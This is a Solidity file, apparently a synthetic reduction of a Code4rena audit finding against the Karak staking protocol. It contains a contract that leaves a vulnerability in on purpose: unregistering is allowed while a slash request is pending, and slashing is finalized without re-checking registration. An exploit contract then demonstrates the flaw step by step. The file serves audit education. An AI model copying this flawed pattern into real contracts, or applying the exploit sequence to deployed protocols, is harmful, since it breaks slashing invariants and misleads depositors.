// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Karak — [H-04] Violation of Invariant Allowing DSSs to Slash Unregistered
    Operators  (20centclub / Code4rena 2024-07-karak, finding #41068)  HIGH
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: Core.sol's `unregisterOperatorFromDSS()` only checks that the
    operator's vaults are fully unstaked from the DSS — it does NOT check for
    any pending slash request against that operator at that DSS. Since
    `finalizeSlashing()` never re-checks the operator's CURRENT registration
    status either, an operator can:
      1. Request to unstake all vaults from a DSS (starts the
         MIN_STAKE_UPDATE_DELAY timer).
      2. Have the DSS request a slash against them DURING that delay window
         (a legitimate action — the DSS still considers them registered).
      3. Finalize the unstake AND unregister from the DSS the moment the
         delay matures — before the slash's own veto window ends.
      4. Have the slash finalize successfully afterward, even though they are
         no longer registered with the DSS at all.
    This breaks the protocol's own stated invariant: "Only DSSs an operator
    is registered with can slash said operator." New users depositing into
    the DSS may be unaware of the pending slash since the operator looks
    fully clean (unregistered) by then. */

contract CoreLike {
    uint256 public constant MIN_STAKE_UPDATE_DELAY = 9 days;
    uint256 public constant SLASHING_VETO_WINDOW = 2 days;

    mapping(address => mapping(address => bool)) public isOperatorRegisteredToDSS; // operator => dss => bool
    mapping(address => mapping(address => bool)) public isVaultStakedInDSS; // operator => dss => bool (simplified: single flag for "has staked vaults")
    mapping(address => uint256) public slashedCount; // operator => number of times successfully slashed

    struct StakeUpdateRequest {
        address operator;
        address dss;
        uint256 requestTime;
        bool finalized;
    }

    mapping(uint256 => StakeUpdateRequest) public stakeUpdateRequests;
    uint256 public nextStakeUpdateId = 1;

    struct SlashRequest {
        address operator;
        address dss;
        uint256 requestTime;
        bool finalized;
    }

    mapping(uint256 => SlashRequest) public slashRequests;
    uint256 public nextSlashId = 1;

    function registerAndStake(address operator, address dss) external {
        isOperatorRegisteredToDSS[operator][dss] = true;
        isVaultStakedInDSS[operator][dss] = true;
    }

    /// @dev `backdateSeconds` folds in "N seconds have already elapsed since
    ///      this request" so MIN_STAKE_UPDATE_DELAY/SLASHING_VETO_WINDOW can
    ///      be demonstrated maturing inside a single local-deploy
    ///      transaction with no time-warp cheatcode — the same effect as the
    ///      real PoC's `skip(N days)` between steps.
    function requestUpdateVaultStakeInDSS(
        address operator,
        address dss,
        uint256 backdateSeconds
    ) external returns (uint256 requestId) {
        requestId = nextStakeUpdateId++;
        stakeUpdateRequests[requestId] = StakeUpdateRequest({
            operator: operator,
            dss: dss,
            requestTime: block.timestamp - backdateSeconds,
            finalized: false
        });
    }

    function finalizeUpdateVaultStakeInDSS(uint256 requestId) external {
        StakeUpdateRequest storage req = stakeUpdateRequests[requestId];
        require(!req.finalized, "already finalized");
        require(block.timestamp >= req.requestTime + MIN_STAKE_UPDATE_DELAY, "delay not elapsed");
        req.finalized = true;
        isVaultStakedInDSS[req.operator][req.dss] = false;
    }

    /// @dev Verbatim reduction of Core.sol's `unregisterOperatorFromDSS()`.
    function unregisterOperatorFromDSS(address operator, address dss) external {
        require(!isVaultStakedInDSS[operator][dss], "vaults still staked");

        // @> VULN Core.sol#L113: no check here for a PENDING slash request
        //    against `operator` at `dss`. The operator can fully unregister
        //    while a slash is still queued and will later finalize against
        //    them — breaking "only DSSs an operator is registered with can
        //    slash said operator."
        //    FIX: require no pending (un-finalized, non-vetoed) slash
        //    request exists for (operator, dss) before allowing unregister.
        isOperatorRegisteredToDSS[operator][dss] = false;
    }

    function requestSlashing(address dss, address operator, uint256 backdateSeconds) external returns (uint256 slashId) {
        require(isOperatorRegisteredToDSS[operator][dss], "not registered");
        slashId = nextSlashId++;
        slashRequests[slashId] = SlashRequest({
            operator: operator,
            dss: dss,
            requestTime: block.timestamp - backdateSeconds,
            finalized: false
        });
    }

    /// @dev Verbatim reduction of Core.sol's `finalizeSlashing()` — note it
    ///      does NOT re-check `isOperatorRegisteredToDSS` at finalize time.
    function finalizeSlashing(uint256 slashId) external {
        SlashRequest storage req = slashRequests[slashId];
        require(!req.finalized, "already finalized");
        require(block.timestamp >= req.requestTime + SLASHING_VETO_WINDOW, "veto window active");
        req.finalized = true;
        slashedCount[req.operator] += 1;
    }
}

contract Exploit {
    CoreLike public core; // CREATE nonce 1
    address public operator; // CREATE nonce 2
    address public dss; // CREATE nonce 3

    uint256 public stakeUpdateId;
    uint256 public slashId;

    constructor() {
        core = new CoreLike(); // nonce 1
        operator = address(new Operator()); // nonce 2
        dss = address(new DSS()); // nonce 3
    }

    function run() external {
        // Operator registers and stakes vaults to the DSS.
        core.registerAndStake(operator, dss);

        // Operator requests to unstake — 9 days already elapsed (matured).
        stakeUpdateId = core.requestUpdateVaultStakeInDSS(operator, dss, 9 days);

        // While that unstake request is still pending (per the real
        // timeline: 8 of the 9 days in), the DSS requests a slash against
        // the operator — a fully legitimate action, since the operator IS
        // still registered at this point. 2 days already elapsed (matured).
        slashId = core.requestSlashing(dss, operator, 2 days);

        // The operator finalizes the unstake (delay matured) and
        // immediately unregisters from the DSS.
        core.finalizeUpdateVaultStakeInDSS(stakeUpdateId);
        core.unregisterOperatorFromDSS(operator, dss);

        bool stillRegistered = core.isOperatorRegisteredToDSS(operator, dss);

        // === Harm: the slash finalizes anyway, against an unregistered operator ===
        core.finalizeSlashing(slashId);

        uint256 timesSlashed = core.slashedCount(operator);

        require(!stillRegistered, "harm not demonstrated: operator should be unregistered");
        require(timesSlashed == 1, "harm not demonstrated: slash should have finalized");
    }
}

/// @dev Stand-in for the operator (a plain address holder).
contract Operator {}

/// @dev Stand-in for the DSS (a plain address holder).
contract DSS {}
